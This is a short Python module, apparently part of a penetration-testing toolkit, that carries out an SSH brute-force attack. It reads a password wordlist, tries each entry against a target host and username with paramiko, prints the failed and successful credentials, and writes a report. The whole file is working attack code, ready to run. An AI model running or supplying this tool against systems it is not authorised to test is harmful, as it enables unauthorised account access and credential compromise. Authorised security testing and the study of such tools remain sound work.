import paramiko
from utils.report_writer import write_report

def run(host, username, wordlist_path, report_name):
    result = {
        "module": "SSH Brute Forcer",
        "target": host,
        "username": username,
        "wordlist": wordlist_path,
        "success": False,
        "password": None,
        "status": None
    }

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()

        print(f"[+] Starting SSH brute-force on {host} with user '{username}'")

        for password in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=host, username=username, password=password, timeout=5)
                
                print(f"[✓] Success: {username}:{password}")
                result["success"] = True
                result["password"] = password
                result["status"] = "success"
                ssh.close()
                break

            except paramiko.AuthenticationException:
                print(f"[-] Failed: {username}:{password}")
            except Exception as e:
                print(f"[!] Error: {e}")
                result["error"] = str(e)
                break

        if not result["success"]:
            result["status"] = "failed"
            print("[!] Brute-force failed. No valid password found.")

    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
        print(f"[!] Error opening wordlist or connecting: {e}")

    write_report(result, report_name)
